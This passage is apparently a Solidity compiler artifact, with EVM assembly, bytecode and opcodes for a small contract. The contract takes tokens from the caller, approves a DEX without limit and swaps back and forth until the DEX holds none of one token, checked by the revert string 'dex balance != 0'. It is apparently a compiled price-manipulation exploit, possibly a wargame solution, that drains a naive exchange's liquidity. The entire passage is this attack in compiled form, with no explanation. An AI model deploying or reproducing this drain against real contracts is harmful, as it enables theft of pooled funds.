tag_91\n        /* \"#utility.yul\":752:757   */\n      dup5\n        /* \"#utility.yul\":725:758   */\n      tag_59\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":716:759   */\n      tag_61\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":698:760   */\n      tag_60\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":685:760   */\n      swap1\n      pop\n        /* \"#utility.yul\":606:766   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":772:921   */\n    tag_63:\n        /* \"#utility.yul\":868:914   */\n      tag_93\n        /* \"#utility.yul\":908:913   */\n      dup2\n        /* \"#utility.yul\":868:914   */\n      tag_62\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":863:866   */\n      dup3\n        /* \"#utility.yul\":856:915   */\n      mstore\n        /* \"#utility.yul\":772:921   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":927:1387   */\n    tag_8:\n        /* \"#utility.yul\":1085:1089   */\n      0x00\n        /* \"#utility.yul\":1123:1125   */\n      0x60\n        /* \"#utility.yul\":1112:1121   */\n      dup3\n        /* \"#utility.yul\":1108:1126   */\n      add\n        /* \"#utility.yul\":1100:1126   */\n      swap1\n      pop\n        /* \"#utility.yul\":1136:1207   */\n      tag_95\n        /* \"#utility.yul\":1204:1205   */\n      0x00\n        /* \"#utility.yul\":1193:1202   */\n      dup4\n        /* \"#utility.yul\":1189:1206   */\n      add\n        /* \"#utility.yul\":1180:1186   */\n      dup7\n        /* \"#utility.yul\":1136:1207   */\n      tag_58\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1217:1289   */\n      tag_96\n        /* \"#utility.yul\":1285:1287   */\n      0x20\n        /* \"#utility.yul\":1274:1283   */\n      dup4\n        /* \"#utility.yul\":1270:1288   */\n      add\n        /* \"#utility.yul\":1261:1267   */\n      dup6\n        /* \"#utility.yul\":1217:1289   */\n      tag_58\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":1299:1380   */\n      tag_97\n        /* \"#utility.yul\":1376:1378   */\n      0x40\n        /* \"#utility.yul\":1365:1374   */\n      dup4\n        /* \"#utility.yul\":1361:1379   */\n      add\n        /* \"#utility.yul\":1352:1358   */\n      dup5\n        /* \"#utility.yul\":1299:1380   */\n      tag_63\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":927:1387   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1474:1591   */\n    tag_65:\n        /* \"#utility.yul\":1583:1584   */\n      0x00\n        /* \"#utility.yul\":1580:1581   */\n      0x00\n        /* \"#utility.yul\":1573:1585   */\n      revert\n        /* \"#utility.yul\":1720:1810   */\n    tag_67:\n        /* \"#utility.yul\":1754:1761   */\n      0x00\n        /* \"#utility.yul\":1797:1802   */\n      dup2\n        /* \"#utility.yul\":1790:1803   */\n      iszero\n        /* \"#utility.yul\":1783:1804   */\n      iszero\n        /* \"#utility.yul\":1772:1804   */\n      swap1\n      pop\n        /* \"#utility.yul\":1720:1810   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1816:1932   */\n    tag_68:\n        /* \"#utility.yul\":1886:1907   */\n      tag_103\n        /* \"#utility.yul\":1901:1906   */\n      dup2\n        /* \"#utility.yul\":1886:1907   */\n      tag_67\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":1879:1884   */\n      dup2\n        /* \"#utility.yul\":1876:1908   */\n      eq\n        /* \"#utility.yul\":1866:1926   */\n      tag_104\n      jumpi\n        /* \"#utility.yul\":1922:1923   */\n      0x00\n        /* \"#utility.yul\":1919:1920   */\n      0x00\n        /* \"#utility.yul\":1912:1924   */\n      revert\n        /* \"#utility.yul\":1866:1926   */\n    tag_104:\n        /* \"#utility.yul\":1816:1932   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1938:2075   */\n    tag_69:\n        /* \"#utility.yul\":1992:1997   */\n      0x00\n        /* \"#utility.yul\":2023:2029   */\n      dup2\n        /* \"#utility.yul\":2017:2030   */\n      mload\n        /* \"#utility.yul\":2008:2030   */\n      swap1\n      pop\n        /* \"#utility.yul\":2039:2069   */\n      tag_106\n        /* \"#utility.yul\":2063:2068   */\n      dup2\n        /* \"#utility.yul\":2039:2069   */\n      tag_68\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":1938:2075   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2081:2426   */\n    tag_12:\n        /* \"#utility.yul\":2148:2154   */\n      0x00\n        /* \"#utility.yul\":2197:2199   */\n      0x20\n        /* \"#utility.yul\":2185:2194   */\n      dup3\n        /* \"#utility.yul\":2176:2183   */\n      dup5\n        /* \"#utility.yul\":2172:2195   */\n      sub\n        /* \"#utility.yul\":2168:2200   */\n      slt\n        /* \"#utility.yul\":2165:2284   */\n      iszero\n      tag_108\n      jumpi\n        /* \"#utility.yul\":2203:2282   */\n      tag_109\n      tag_65\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2165:2284   */\n    tag_108:\n        /* \"#utility.yul\":2323:2324   */\n      0x00\n        /* \"#utility.yul\":2348:2409   */\n      tag_110\n        /* \"#utility.yul\":2401:2408   */\n      dup5\n        /* \"#utility.yul\":2392:2398   */\n      dup3\n        /* \"#utility.yul\":2381:2390   */\n      dup6\n        /* \"#utility.yul\":2377:2399   */\n      add\n        /* \"#utility.yul\":2348:2409   */\n      tag_69\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":2338:2409   */\n      swap2\n      pop\n        /* \"#utility.yul\":2294:2419   */\n      pop\n        /* \"#utility.yul\":2081:2426   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2432:2550   */\n    tag_70:\n        /* \"#utility.yul\":2519:2543   */\n      tag_112\n        /* \"#utility.yul\":2537:2542   */\n      dup2\n        /* \"#utility.yul\":2519:2543   */\n      tag_60\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":2514:2517   */\n      dup3\n        /* \"#utility.yul\":2507:2544   */\n      mstore\n        /* \"#utility.yul\":2432:2550   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2556:2888   */\n    tag_18:\n        /* \"#utility.yul\":2677:2681   */\n      0x00\n        /* \"#utility.yul\":2715:2717   */\n      0x40\n        /* \"#utility.yul\":2704:2713   */\n      dup3\n        /* \"#utility.yul\":2700:2718   */\n      add\n        /* \"#utility.yul\":2692:2718   */\n      swap1\n      pop\n        /* \"#utility.yul\":2728:2799   */\n      tag_114\n        /* \"#utility.yul\":2796:2797   */\n      0x00\n        /* \"#utility.yul\":2785:2794   */\n      dup4\n        /* \"#utility.yul\":2781:2798   */\n      add\n        /* \"#utility.yul\":2772:2778   */\n      dup6\n        /* \"#utility.yul\":2728:2799   */\n      tag_58\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":2809:2881   */\n      tag_115\n        /* \"#utility.yul\":2877:2879   */\n      0x20\n        /* \"#utility.yul\":2866:2875   */\n      dup4\n        /* \"#utility.yul\":2862:2880   */\n      add\n        /* \"#utility.yul\":2853:2859   */\n      dup5\n        /* \"#utility.yul\":2809:2881   */\n      tag_70\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":2556:2888   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2894:2980   */\n    tag_71:\n        /* \"#utility.yul\":2940:2947   */\n      0x00\n        /* \"#utility.yul\":2969:2974   */\n      dup2\n        /* \"#utility.yul\":2958:2974   */\n      swap1\n      pop\n        /* \"#utility.yul\":2894:2980   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2986:3146   */\n    tag_72:\n        /* \"#utility.yul\":3045:3054   */\n      0x00\n        /* \"#utility.yul\":3078:3140   */\n      tag_118\n        /* \"#utility.yul\":3096:3139   */\n      tag_119\n        /* \"#utility.yul\":3105:3138   */\n      tag_120\n        /* \"#utility.yul\":3132:3137   */\n      dup5\n        /* \"#utility.yul\":3105:3138   */\n      tag_71\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":3096:3139   */\n      tag_61\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":3078:3140   */\n      tag_60\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":3065:3140   */\n      swap1\n      pop\n        /* \"#utility.yul\":2986:3146   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3152:3301   */\n    tag_73:\n        /* \"#utility.yul\":3248:3294   */\n      tag_122\n        /* \"#utility.yul\":3288:3293   */\n      dup2\n        /* \"#utility.yul\":3248:3294   */\n      tag_72\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":3243:3246   */\n      dup3\n        /* \"#utility.yul\":3236:3295   */\n      mstore\n        /* \"#utility.yul\":3152:3301   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3307:3767   */\n    tag_33:\n        /* \"#utility.yul\":3465:3469   */\n      0x00\n        /* \"#utility.yul\":3503:3505   */\n      0x60\n        /* \"#utility.yul\":3492:3501   */\n      dup3\n        /* \"#utility.yul\":3488:3506   */\n      add\n        /* \"#utility.yul\":3480:3506   */\n      swap1\n      pop\n        /* \"#utility.yul\":3516:3587   */\n      tag_124\n        /* \"#utility.yul\":3584:3585   */\n      0x00\n        /* \"#utility.yul\":3573:3582   */\n      dup4\n        /* \"#utility.yul\":3569:3586   */\n      add\n        /* \"#utility.yul\":3560:3566   */\n      dup7\n        /* \"#utility.yul\":3516:3587   */\n      tag_58\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":3597:3669   */\n      tag_125\n        /* \"#utility.yul\":3665:3667   */\n      0x20\n        /* \"#utility.yul\":3654:3663   */\n      dup4\n        /* \"#utility.yul\":3650:3668   */\n      add\n        /* \"#utility.yul\":3641:3647   */\n      dup6\n        /* \"#utility.yul\":3597:3669   */\n      tag_58\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":3679:3760   */\n      tag_126\n        /* \"#utility.yul\":3756:3758   */\n      0x40\n        /* \"#utility.yul\":3745:3754   */\n      dup4\n        /* \"#utility.yul\":3741:3759   */\n      add\n        /* \"#utility.yul\":3732:3738   */\n      dup5\n        /* \"#utility.yul\":3679:3760   */\n      tag_73\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":3307:3767   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3773:3995   */\n    tag_38:\n        /* \"#utility.yul\":3866:3870   */\n      0x00\n        /* \"#utility.yul\":3904:3906   */\n      0x20\n        /* \"#utility.yul\":3893:3902   */\n      dup3\n        /* \"#utility.yul\":3889:3907   */\n      add\n        /* \"#utility.yul\":3881:3907   */\n      swap1\n      pop\n        /* \"#utility.yul\":3917:3988   */\n      tag_128\n        /* \"#utility.yul\":3985:3986   */\n      0x00\n        /* \"#utility.yul\":3974:3983   */\n      dup4\n        /* \"#utility.yul\":3970:3987   */\n      add\n        /* \"#utility.yul\":3961:3967   */\n      dup5\n        /* \"#utility.yul\":3917:3988   */\n      tag_58\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":3773:3995   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4001:4123   */\n    tag_74:\n        /* \"#utility.yul\":4074:4098   */\n      tag_130\n        /* \"#utility.yul\":4092:4097   */\n      dup2\n        /* \"#utility.yul\":4074:4098   */\n      tag_60\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":4067:4072   */\n      dup2\n        /* \"#utility.yul\":4064:4099   */\n      eq\n        /* \"#utility.yul\":4054:4117   */\n      tag_131\n      jumpi\n        /* \"#utility.yul\":4113:4114   */\n      0x00\n        /* \"#utility.yul\":4110:4111   */\n      0x00\n        /* \"#utility.yul\":4103:4115   */\n      revert\n        /* \"#utility.yul\":4054:4117   */\n    tag_131:\n        /* \"#utility.yul\":4001:4123   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4129:4272   */\n    tag_75:\n        /* \"#utility.yul\":4186:4191   */\n      0x00\n        /* \"#utility.yul\":4217:4223   */\n      dup2\n        /* \"#utility.yul\":4211:4224   */\n      mload\n        /* \"#utility.yul\":4202:4224   */\n      swap1\n      pop\n        /* \"#utility.yul\":4233:4266   */\n      tag_133\n        /* \"#utility.yul\":4260:4265   */\n      dup2\n        /* \"#utility.yul\":4233:4266   */\n      tag_74\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":4129:4272   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4278:4629   */\n    tag_42:\n        /* \"#utility.yul\":4348:4354   */\n      0x00\n        /* \"#utility.yul\":4397:4399   */\n      0x20\n        /* \"#utility.yul\":4385:4394   */\n      dup3\n        /* \"#utility.yul\":4376:4383   */\n      dup5\n        /* \"#utility.yul\":4372:4395   */\n      sub\n        /* \"#utility.yul\":4368:4400   */\n      slt\n        /* \"#utility.yul\":4365:4484   */\n      iszero\n      tag_135\n      jumpi\n        /* \"#utility.yul\":4403:4482   */\n      tag_136\n      tag_65\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":4365:4484   */\n    tag_135:\n        /* \"#utility.yul\":4523:4524   */\n      0x00\n        /* \"#utility.yul\":4548:4612   */\n      tag_137\n        /* \"#utility.yul\":4604:4611   */\n      dup5\n        /* \"#utility.yul\":4595:4601   */\n      dup3\n        /* \"#utility.yul\":4584:4593   */\n      dup6\n        /* \"#utility.yul\":4580:4602   */\n      add\n        /* \"#utility.yul\":4548:4612   */\n      tag_75\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":4538:4612   */\n      swap2\n      pop\n        /* \"#utility.yul\":4494:4622   */\n      pop\n        /* \"#utility.yul\":4278:4629   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4635:4804   */\n    tag_76:\n        /* \"#utility.yul\":4719:4730   */\n      0x00\n        /* \"#utility.yul\":4753:4759   */\n      dup3\n        /* \"#utility.yul\":4748:4751   */\n      dup3\n        /* \"#utility.yul\":4741:4760   */\n      mstore\n        /* \"#utility.yul\":4793:4797   */\n      0x20\n        /* \"#utility.yul\":4788:4791   */\n      dup3\n        /* \"#utility.yul\":4784:4798   */\n      add\n        /* \"#utility.yul\":4769:4798   */\n      swap1\n      pop\n        /* \"#utility.yul\":4635:4804   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4810:4976   */\n    tag_77:\n        /* \"#utility.yul\":4950:4968   */\n      0x6465782062616c616e636520213d203000000000000000000000000000000000\n        /* \"#utility.yul\":4946:4947   */\n      0x00\n        /* \"#utility.yul\":4938:4944   */\n      dup3\n        /* \"#utility.yul\":4934:4948   */\n      add\n        /* \"#utility.yul\":4927:4969   */\n      mstore\n        /* \"#utility.yul\":4810:4976   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4982:5348   */\n    tag_78:\n        /* \"#utility.yul\":5124:5127   */\n      0x00\n        /* \"#utility.yul\":5145:5212   */\n      tag_141\n        /* \"#utility.yul\":5209:5211   */\n      0x10\n        /* \"#utility.yul\":5204:5207   */\n      dup4\n        /* \"#utility.yul\":5145:5212   */\n      tag_76\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":5138:5212   */\n      swap2\n      pop\n        /* \"#utility.yul\":5221:5314   */\n      tag_142\n        /* \"#utility.yul\":5310:5313   */\n      dup3\n        /* \"#utility.yul\":5221:5314   */\n      tag_77\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":5339:5341   */\n      0x20\n        /* \"#utility.yul\":5334:5337   */\n      dup3\n        /* \"#utility.yul\":5330:5342   */\n      add\n        /* \"#utility.yul\":5323:5342   */\n      swap1\n      pop\n        /* \"#utility.yul\":4982:5348   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5354:5773   */\n    tag_45:\n        /* \"#utility.yul\":5520:5524   */\n      0x00\n        /* \"#utility.yul\":5558:5560   */\n      0x20\n        /* \"#utility.yul\":5547:5556   */\n      dup3\n        /* \"#utility.yul\":5543:5561   */\n      add\n        /* \"#utility.yul\":5535:5561   */\n      swap1\n      pop\n        /* \"#utility.yul\":5607:5616   */\n      dup2\n        /* \"#utility.yul\":5601:5605   */\n      dup2\n        /* \"#utility.yul\":5597:5617   */\n      sub\n        /* \"#utility.yul\":5593:5594   */\n      0x00\n        /* \"#utility.yul\":5582:5591   */\n      dup4\n        /* \"#utility.yul\":5578:5595   */\n      add\n        /* \"#utility.yul\":5571:5618   */\n      mstore\n        /* \"#utility.yul\":5635:5766   */\n      tag_144\n        /* \"#utility.yul\":5761:5765   */\n      dup2\n        /* \"#utility.yul\":5635:5766   */\n      tag_78\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":5627:5766   */\n      swap1\n      pop\n        /* \"#utility.yul\":5354:5773   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5779:6221   */\n    tag_52:\n        /* \"#utility.yul\":5928:5932   */\n      0x00\n        /* \"#utility.yul\":5966:5968   */\n      0x60\n        /* \"#utility.yul\":5955:5964   */\n      dup3\n        /* \"#utility.yul\":5951:5969   */\n      add\n        /* \"#utility.yul\":5943:5969   */\n      swap1\n      pop\n        /* \"#utility.yul\":5979:6050   */\n      tag_146\n        /* \"#utility.yul\":6047:6048   */\n      0x00\n        /* \"#utility.yul\":6036:6045   */\n      dup4\n        /* \"#utility.yul\":6032:6049   */\n      add\n        /* \"#utility.yul\":6023:6029   */\n      dup7\n        /* \"#utility.yul\":5979:6050   */\n      tag_58\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":6060:6132   */\n      tag_147\n        /* \"#utility.yul\":6128:6130   */\n      0x20\n        /* \"#utility.yul\":6117:6126   */\n      dup4\n        /* \"#utility.yul\":6113:6131   */\n      add\n        /* \"#utility.yul\":6104:6110   */\n      dup6\n        /* \"#utility.yul\":6060:6132   */\n      tag_58\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":6142:6214   */\n      tag_148\n        /* \"#utility.yul\":6210:6212   */\n      0x40\n        /* \"#utility.yul\":6199:6208   */\n      dup4\n        /* \"#utility.yul\":6195:6213   */\n      add\n        /* \"#utility.yul\":6186:6192   */\n      dup5\n        /* \"#utility.yul\":6142:6214   */\n      tag_70\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":5779:6221   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c73c217d284a5c8f4b183daa2e9f0dc37bc870697fc621220e8c3dcaeab98ff064736f6c634300081b0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60e060405234801561000f575f5ffd5b50604051610dcd380380610dcd8339818101604052810190610031919061021e565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505060805173ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100b0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d49190610273565b73ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff168152505060805173ffffffffffffffffffffffffffffffffffffffff166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610152573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101769190610273565b73ffffffffffffffffffffffffffffffffffffffff1660c08173ffffffffffffffffffffffffffffffffffffffff16815250505061029e565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101dc826101b3565b9050919050565b5f6101ed826101d2565b9050919050565b6101fd816101e3565b8114610207575f5ffd5b50565b5f81519050610218816101f4565b92915050565b5f60208284031215610233576102326101af565b5b5f6102408482850161020a565b91505092915050565b610252816101d2565b811461025c575f5ffd5b50565b5f8151905061026d81610249565b92915050565b5f60208284031215610288576102876101af565b5b5f6102958482850161025f565b91505092915050565b60805160a05160c051610a8261034b5f395f818160d801528181610253015281816103530152818161037c015281816103e7015281816104100152818161047b01526104dd01525f8181603901528181610177015281816103320152818161039d015281816103c6015281816104310152818161045a015281816104fe015261056d01525f81816101b30152818161028f015281816104a1015281816105a901526106670152610a825ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063dd365b8b1461002d575b5f5ffd5b610035610037565b005b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166323b872dd3330600a6040518463ffffffff1660e01b8152600401610095939291906107f4565b6020604051808303815f875af11580156100b1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d59190610862565b507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166323b872dd3330600a6040518463ffffffff1660e01b8152600401610134939291906107f4565b6020604051808303815f875af1158015610150573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101749190610862565b507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663095ea7b37f00000000000000000000000000000000000000000000000000000000000000007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040161021092919061089c565b6020604051808303815f875af115801561022c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102509190610862565b507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663095ea7b37f00000000000000000000000000000000000000000000000000000000000000007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016102ec92919061089c565b6020604051808303815f875af1158015610308573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061032c9190610862565b506103777f00000000000000000000000000000000000000000000000000000000000000007f0000000000000000000000000000000000000000000000000000000000000000610665565b6103c17f00000000000000000000000000000000000000000000000000000000000000007f0000000000000000000000000000000000000000000000000000000000000000610665565b61040b7f00000000000000000000000000000000000000000000000000000000000000007f0000000000000000000000000000000000000000000000000000000000000000610665565b6104557f00000000000000000000000000000000000000000000000000000000000000007f0000000000000000000000000000000000000000000000000000000000000000610665565b61049f7f00000000000000000000000000000000000000000000000000000000000000007f0000000000000000000000000000000000000000000000000000000000000000610665565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663df791e507f00000000000000000000000000000000000000000000000000000000000000007f0000000000000000000000000000000000000000000000000000000000000000602d6040518463ffffffff1660e01b815260040161053d939291906108fc565b5f604051808303815f87803b158015610554575f5ffd5b505af1158015610566573d5f5f3e3d5ffd5b505050505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166370a082317f00000000000000000000000000000000000000000000000000000000000000006040518263ffffffff1660e01b81526004016105e49190610931565b602060405180830381865afa1580156105ff573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106239190610974565b14610663576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161065a906109f9565b60405180910390fd5b565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663df791e5083838573ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106dc9190610931565b602060405180830381865afa1580156106f7573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061071b9190610974565b6040518463ffffffff1660e01b815260040161073993929190610a17565b5f604051808303815f87803b158015610750575f5ffd5b505af1158015610762573d5f5f3e3d5ffd5b505050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6107938261076a565b9050919050565b6107a381610789565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f6107de6107d96107d4846107a9565b6107bb565b6107b2565b9050919050565b6107ee816107c4565b82525050565b5f6060820190506108075f83018661079a565b610814602083018561079a565b61082160408301846107e5565b949350505050565b5f5ffd5b5f8115159050919050565b6108418161082d565b811461084b575f5ffd5b50565b5f8151905061085c81610838565b92915050565b5f6020828403121561087757610876610829565b5b5f6108848482850161084e565b91505092915050565b610896816107b2565b82525050565b5f6040820190506108af5f83018561079a565b6108bc602083018461088d565b9392505050565b5f819050919050565b5f6108e66108e16108dc846108c3565b6107bb565b6107b2565b9050919050565b6108f6816108cc565b82525050565b5f60608201905061090f5f83018661079a565b61091c602083018561079a565b61092960408301846108ed565b949350505050565b5f6020820190506109445f83018461079a565b92915050565b610953816107b2565b811461095d575f5ffd5b50565b5f8151905061096e8161094a565b92915050565b5f6020828403121561098957610988610829565b5b5f61099684828501610960565b91505092915050565b5f82825260208201905092915050565b7f6465782062616c616e636520213d2030000000000000000000000000000000005f82015250565b5f6109e360108361099f565b91506109ee826109af565b602082019050919050565b5f6020820190508181035f830152610a10816109d7565b9050919050565b5f606082019050610a2a5f83018661079a565b610a37602083018561079a565b610a44604083018461088d565b94935050505056fea2646970667358221220c73c217d284a5c8f4b183daa2e9f0dc37bc870697fc621220e8c3dcaeab98ff064736f6c634300081b0033",
					"opcodes": "PUSH1 0xE0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xDCD CODESIZE SUB DUP1 PUSH2 0xDCD DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x21E JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH1 0x80 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xB0 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD4 SWAP2 SWAP1 PUSH2 0x273 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xA0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH1 0x80 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x25BE124E PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x152 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x176 SWAP2 SWAP1 PUSH2 0x273 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xC0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0x29E JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1DC DUP3 PUSH2 0x1B3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1ED DUP3 PUSH2 0x1D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1FD DUP2 PUSH2 0x1E3 JUMP JUMPDEST DUP2 EQ PUSH2 0x207 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x218 DUP2 PUSH2 0x1F4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x233 JUMPI PUSH2 0x232 PUSH2 0x1AF JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x240 DUP5 DUP3 DUP6 ADD PUSH2 0x20A JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x252 DUP2 PUSH2 0x1D2 JUMP JUMPDEST DUP2 EQ PUSH2 0x25C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 